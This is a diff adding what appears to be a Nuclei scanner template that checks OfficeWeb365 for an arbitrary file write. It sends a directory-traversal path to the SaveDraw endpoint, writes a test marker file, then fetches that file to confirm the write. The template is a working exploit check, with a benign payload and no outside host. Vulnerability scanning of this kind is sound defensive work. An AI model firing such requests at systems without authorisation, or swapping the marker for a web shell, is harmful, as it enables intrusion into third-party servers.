@@ -1,0 +1,31 @@
+id: officeweb365-savedraw-upload
+info:
+  name: sb
+  author: sb
+  severity: critical
+  description: fofa officeweb365 windows 绝对路径 C:/OfficeWeb365/officeweb/Content/img/UserDraw/
+  reference:
+http:
+  - raw:
+      - |
+        GET /PW/SaveDraw?path=../../Content/img&idx=xxx.txt HTTP/1.1
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: ASP.NET_SessionId=vayccioy4mobcb3mf5s5og2r
+
+        data:image/png;base64,01s34567890123456789y12345678901234567m91<test>}---
+      - |
+        GET /Content/img/UserDraw/drawPWxxx.txt HTTP/1.1
+        
+    req-condition: true
+    matchers-condition: and
+    redirects: false
+    matchers: 
+      - type: dsl
+        dsl:
+          - 'contains(body_1,"ok") && contains(body_2,"<test>")'
+                
+   
